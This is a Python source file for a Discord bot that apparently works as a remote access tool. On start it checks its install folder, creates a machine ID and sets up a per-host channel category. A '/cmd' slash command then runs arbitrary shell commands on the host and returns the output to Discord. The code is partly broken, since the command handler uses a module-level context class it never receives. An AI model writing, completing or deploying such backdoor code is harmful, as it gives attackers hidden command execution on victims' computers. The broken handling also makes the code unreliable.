#normal imports
from interactions import slash_command, SlashContext
from interactions import OptionType, slash_option
from interactions import Client, Intents, listen
from interactions import ChannelType
import os
#my imports
from modules import basic_functions as functions
from modules import settings  
#local settings
ctx = SlashContext
#check if the file is in the final folder   
functions.check_location(settings.location())
#create a ID on start 
functions.create_or_read_id_file()
print(functions.create_or_read_id_file())
#discord set intents
bot = Client(intents=Intents.DEFAULT)

@listen()
async def on_ready():
    category_name = functions.category_name()

    guild = bot.get_guild(settings.guild_id())  
    channels = await guild.fetch_channels()
    existing_categories = [channel for channel in channels if channel.type == ChannelType.GUILD_CATEGORY]

    # create catagory in discord
    category = None
    if category_name not in [c.name for c in existing_categories]:
        category = await guild.create_category(category_name)
        print(f"Kategorie {category_name} erstellt.")
    else:
        category = next((c for c in existing_categories if c.name == category_name), None)
        print(f"Kategorie {category_name} existiert bereits.")

    # create channels
    if category:
        await category.create_text_channel("info")
        await category.create_text_channel("main")
        await category.create_text_channel("spam")



#example command
@slash_command(name="cmd", description="execute cmd commands")
@slash_option(
    name="ID",
    description="user_ID",
    required=True,
    opt_type=OptionType.INTEGER,
)
@slash_option(
    name = "command",
    description="the cmd command",
    required=True,
    opt_type=OptionType.STRING
)
async def cmd(ID: int, command: str):
    if(ID == functions.create_or_read_id_file()):
        output = functions.exe_cmd(command)
        await ctx.send(output)

#@slash_command(name="cmd", description="Reagiert nur im 'main' Channel der spezifischen Kategorie")
#@slash_option(
#    name="guild_id",
#    opt_type=OptionType.CHANNEL
#)
#async def cmd(ctx: SlashContext):
#    category_name = functions.category_name()
#
#    # Check if command was used in this category
#    guild_channels = await bot.get_guild_channels(ctx.guild_id)
#    category = next((channel for channel in guild_channels if channel.type == ChannelType.GUILD_CATEGORY and channel.name == category_name), None)
#
#    if category and ctx.channel_id in [channel.id for channel in guild_channels if channel.parent_id == category.id]:
#        # Check if it was used in 'main'
#        main_channel = next((channel for channel in guild_channels if channel.name == "main" and channel.parent_id == category.id), None)
#        if main_channel and ctx.channel_id == main_channel.id:
#            await ctx.send("Befehl im richtigen 'main' Channel ausgeführt!")
#        else:
#            await ctx.send("Dieser Befehl kann nur im 'main' Channel der spezifischen Kategorie ausgeführt werden.")
#    else:
#        await ctx.send("Dieser Befehl kann nur in der spezifischen Kategorie ausgeführt werden.")
#


#start bot
bot.start(settings.token())